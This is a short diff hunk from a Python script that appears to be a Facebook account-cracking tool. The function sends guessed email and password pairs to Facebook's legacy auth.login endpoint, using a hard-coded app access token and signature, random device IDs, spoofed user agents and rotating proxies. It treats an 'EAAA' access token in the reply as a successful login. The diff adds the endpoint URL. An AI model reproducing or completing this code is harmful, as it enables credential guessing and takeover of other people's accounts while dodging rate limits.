@@ -1312,6 +1312,7 @@ def fanky_b_api(idf, pwv):
 			headers = { "User-Agent": ua, "Content-Type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger", "Connection": "keep-alive" }
 			# params = { "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32", "sdk_version": random.randint(40, 80), "email": idf, "password": pw, "locale": "id_ID", "sdk": "android", "generate_session_cookies": "1", "sig": "3f555f99fb61fcd7aa0c44f58f522ef6", "advertiser_id": str(uuid.uuid4()), "device_id": str(uuid.uuid4()), "family_device_id": str(uuid.uuid4()), "credentials_type": "password", "client_country_code": "ID", "method": "auth.login"}
 			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': idf, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
+			api = 'https://b-api.facebook.com/method/auth.login'
 			po = requests.get(api, params=params, headers=headers,proxies=proxs) 
 			#match = re.search(r'(EAAA\w+)', po.text)
 			if re.search(r'(EAAA)\w+', str(po.text)):
